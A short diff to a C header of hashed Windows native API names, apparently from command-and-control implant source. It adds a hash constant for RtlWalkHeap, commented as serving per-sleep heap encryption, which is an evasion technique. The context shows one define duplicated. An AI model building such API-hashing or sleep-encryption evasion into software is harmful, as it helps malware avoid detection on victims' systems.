@@ -92,6 +92,8 @@
 #define H_FUNC_RTLALLOCATEHEAP                       0x3be94c5a
 #define H_FUNC_RTLREALLOCATEHEAP                     0xaf740371
 #define H_FUNC_RTLFREEHEAP                           0x73a9e4d7
+/* ARC-04: heap walk for per-sleep encryption */
+#define H_FUNC_RTLWALKHEAP                           0x182bae64
 #define H_FUNC_RTLEXITUSERPROCESS                    0x57c72f
 #define H_FUNC_RTLRANDOMEX                           0x7f1224f5
 #define H_FUNC_RTLRANDOMEX                           0x7f1224f5
